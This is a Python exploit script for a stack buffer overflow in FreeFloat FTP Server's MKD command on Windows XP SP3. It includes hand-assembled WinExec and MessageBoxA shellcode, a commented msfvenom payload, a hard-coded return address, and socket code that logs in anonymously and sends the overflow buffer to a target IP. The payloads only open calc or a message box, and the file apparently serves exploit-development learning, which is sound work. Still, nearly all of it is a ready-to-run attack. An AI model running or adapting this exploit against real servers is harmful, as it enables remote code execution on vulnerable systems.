#!/usr/bin/python

import socket
import sys

target_host = "192.168.84.199"
target_port = 21

#----------------------------------------------------------------------------------#
# Exploit: FreeFloat FTP (MKD BOF)                                                 #
# OS: WinXP PRO SP3                                                                #
# Author: van6uard (Dustin Silveri)                                                #
#----------------------------------------------------------------------------------#


# The easy way
# msfvenom -p windows/messagebox -f python -v shellcode -b "\x00\x0A\x0D"
# [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
# [-] No arch selected, selecting arch: x86 from the payload
# Found 11 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 299 (iteration=0)
# x86/shikata_ga_nai chosen with final size 299
# Payload size: 299 bytes
# Final size of python file: 1689 bytes
#shellcode = (
#"\xb8\xe0\x20\xa7\x98\xdb\xd1\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
#"\x42\x31\x42\x12\x83\xc2\x04\x03\xa2\x2e\x45\x6d\xfb\xc4\x12"
#"\x57\x8f\x3e\xd1\x59\xbd\x8d\x6e\xab\x88\x96\x1b\xba\x3a\xdc"
#"\x6a\x31\xb1\x94\x8e\xc2\x83\x50\x24\xaa\x2b\xea\x0c\x6b\x64"
#"\xf4\x05\x78\x23\x05\x37\x81\x32\x65\x3c\x12\x90\x42\xc9\xae"
#"\xe4\x01\x99\x18\x6c\x17\xc8\xd2\xc6\x0f\x87\xbf\xf6\x2e\x7c"
#"\xdc\xc2\x79\x09\x17\xa1\x7b\xe3\x69\x4a\x4a\x3b\x75\x18\x29"
#"\x7b\xf2\x67\xf3\xb3\xf6\x66\x34\xa0\xfd\x53\xc6\x13\xd6\xd6"
#"\xd7\xd7\x7c\x3c\x19\x03\xe6\xb7\x15\x98\x6c\x9d\x39\x1f\x98"
#"\xaa\x46\x94\x5f\x44\xcf\xee\x7b\x88\xb1\x2d\x31\xb8\x18\x66"
#"\xbf\x5d\xd3\x44\xa8\x13\xaa\x46\xc5\x79\xdb\xc8\xea\x82\xe4"
#"\x7e\x51\x78\xa0\xff\x82\x62\xa5\x78\x2e\x46\x18\x6f\xc1\x79"
#"\x63\x90\x57\xc0\x94\x07\x04\xa6\x84\x96\xbc\x05\xf7\x36\x59"
#"\x01\x82\x35\xc4\xa3\xe4\xe6\x22\x49\x7c\xf0\x7d\xb2\x2b\xf9"
#"\x08\x8e\x84\xba\xa3\xac\x68\x01\x34\xac\x56\x2b\xd3\xad\x69"
#"\x34\xdc\x45\xce\xeb\x03\xb5\x86\x89\x70\x86\x30\x7f\xac\x60"
#"\xe0\x5b\x56\xf9\xfa\xcc\x0e\xd9\xdc\x2c\xc7\x7b\x72\x55\x36"
#"\x13\xf8\xcd\x5d\xc3\x68\x5e\xf1\x73\x49\x6f\xc4\xfb\xc5\xab"
#"\xda\x72\x34\x82\x30\xd6\xe4\xb4\xe6\x29\xda\x06\xc7\x85\x24"
#"\x3d\xcf")

# Manual way
#"\x33\xc0"             => XOR EAX,EAX          |  Zero out EAX register
#"\x50"                 => PUSH EAX             |  Push EAX to have null-byte padding for "calc.exe"
#"\x68\x2E\x65\x78\x65" => PUSH ".exe"          \  Push The ASCII string to the stack
#"\x68\x63\x61\x6C\x63" => PUSH "calc"          /  
#"\x8B\xC4"             => MOV EAX,ESP          |  Put a pointer to the ASCII string in EAX
#"\x6A\x01"             => PUSH 1               |  Push uCmdShow parameter to the stack
#"\x50"                 => PUSH EAX             |  Push the pointer to lpCmdLine to the stack
#"\xBB\xED\x2A\x86\x7C" => MOV EBX,7C862AED     |  Move the pointer to WinExec() into EBX
#"\xFF\xD3"             => CALL EBX             |  Call WinExec()


#----------------------------------------------------------------------------------#
# (*) WinExec                                                                      #
# (*) arwin.exe => Kernel32.dll - WinExec 0x7C862AED                               #
# (*) MSDN Structure:                                                              #
#                                                                                  #
# UINT WINAPI WinExec(            => PTR to WinExec                                #
#   __in  LPCSTR lpCmdLine,       => calc.exe                                      #
#   __in  UINT uCmdShow           => 0x1                                           #
# );                                                                               #
#                                                                                  #
# Final Size => 26-bytes (metasploit version size => 229-bytes)                    #
#----------------------------------------------------------------------------------#
WinExec = (
"\x33\xc0"                          # XOR EAX,EAXa  -> padding for lbCmdLine
"\x50"                              # PUSH EAX      -> padding for lpCmdLine
"\x68\x2E\x65\x78\x65"              # PUSH ".exe"
"\x68\x63\x61\x6C\x63"              # PUSH "calc"
"\x8B\xC4"                          # MOV EAX,ESP
"\x6A\x01"                          # PUSH 1
"\x50"                              # PUSH EAX
"\xBB\xED\x2A\x86\x7C"              # MOV EBX,kernel32.WinExec
"\xFF\xD3")                         # CALL EBX

#----------------------------------------------------------------------------------#
# (*) MessageBoxA                                                                  #
# (*) arwin.exe => user32.dll - MessageBoxA 0x7E4507EA                             #
# (*) MSDN Structure:                                                              #
#                                                                                  #
# int WINAPI MessageBox(          => PTR to MessageBoxA                            #
#   __in_opt  HWND hWnd,          => 0x0                                           #
#   __in_opt  LPCTSTR lpText,     => Pop the box!                                  #
#   __in_opt  LPCTSTR lpCaption,  => b33f                                          #
#   __in      UINT uType          => 0x0                                           #
# );                                                                               #
#                                                                                  #
# Final Size => 39-bytes (metasploit version size => 287-bytes)                    #
#----------------------------------------------------------------------------------#
MessageBoxA = (
"\x33\xc0"                          # XOR EAX,EAX
"\x50"                              # PUSH EAX      => padding for lpCaption
"\x68\x62\x33\x33\x66"              # PUSH "b33f"
"\x8B\xCC"                          # MOV ECX,ESP   => PTR to lpCaption
"\x50"                              # PUSH EAX      => padding for lpText
"\x68\x62\x6F\x78\x21"              # PUSH "box!"
"\x68\x74\x68\x65\x20"              # PUSH "the "
"\x68\x50\x6F\x70\x20"              # PUSH "Pop "
"\x8B\xD4"                          # MOV EDX,ESP   => PTR to lpText
"\x50"                              # PUSH EAX - uType=0x0
"\x51"                              # PUSH ECX - lpCaption
"\x52"                              # PUSH EDX - lpText
"\x50"                              # PUSH EAX - hWnd=0x0
"\xBE\xEA\x07\x45\x7E"              # MOV ESI,USER32.MessageBoxA
"\xFF\xD6")                         # CALL ESI
  


#----------------------------------------------------------------------------------#
# Badchars: \x00\x0A\x0D                                                           #
# 0x77c35459 : push esp #  ret  | msvcrt.dll                                       #
# shellcode at ESP => space 749-bytes                                              #
#----------------------------------------------------------------------------------#


buffer = "A" * 248 + "\x59\x54\xC3\x77" +"\x90"*16 + MessageBoxA + "D" * (1000-248-4-len(MessageBoxA))


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((target_host,target_port))
response = s.recv(1024)
s.send('anonymous\r\n')
response = s.recv(1024)
s.send('anonymous\r\n')
response = s.recv(1024)

s.send('MKD' + buffer + '\r\n')

print "[+] Evil buffer sent"
s.close()

